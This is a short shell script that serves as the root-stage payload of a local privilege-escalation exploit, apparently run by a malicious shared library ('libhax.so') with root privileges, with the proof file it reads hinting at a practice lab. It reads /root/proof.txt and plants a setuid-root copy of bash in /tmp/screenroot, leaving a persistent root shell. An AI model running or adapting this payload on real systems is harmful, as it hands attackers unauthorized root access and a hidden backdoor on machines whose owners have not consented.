#!/bin/sh
# rootcmd.sh — what root should do for us. Executed by libhax.so's constructor
# as euid 0, with stdout+stderr redirected to /rootout.txt by the library.
# Edit this file to change the goal; it is the only thing that needs to change
# when the objective is "read a different file" rather than "get a shell".

id
hostname
echo "--- proof.txt ---"
cat /root/proof.txt
echo "--- artifacts ---"
cp /bin/bash /tmp/screenroot/rbash
chmod 4755 /tmp/screenroot/rbash
ls -la /tmp/screenroot
